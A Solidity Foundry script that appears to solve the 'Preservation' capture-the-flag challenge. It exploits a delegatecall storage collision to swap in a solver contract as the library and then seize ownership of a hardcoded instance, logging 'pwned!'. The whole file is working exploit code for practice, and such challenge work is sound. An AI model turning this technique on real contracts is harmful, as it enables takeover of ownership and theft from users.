pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/PreservationSolver.sol";
import "../challs/Preservation.sol";
contract PreservationScript is Script {
    function run() external {
        vm.startBroadcast();
        PreservationSolver solver = new PreservationSolver();
        Preservation instance = Preservation(0x25d2Ff99A80C88C61d0E8D336E9Af71511bc69F9);
        instance.setFirstTime(uint256(uint160(address(solver))));
        if (instance.timeZone1Library() == address(solver)) {
            console.log("[G] change timezone1 to solver address");
        }else {
            console.log("[F] change timezone1 to solver address");
        }

        instance.setFirstTime(uint256(uint160(address(msg.sender))));
        if (instance.owner() == msg.sender) {
            console.log("pwned!");
        } else {
            console.log("something went wrong");
        }

    }
}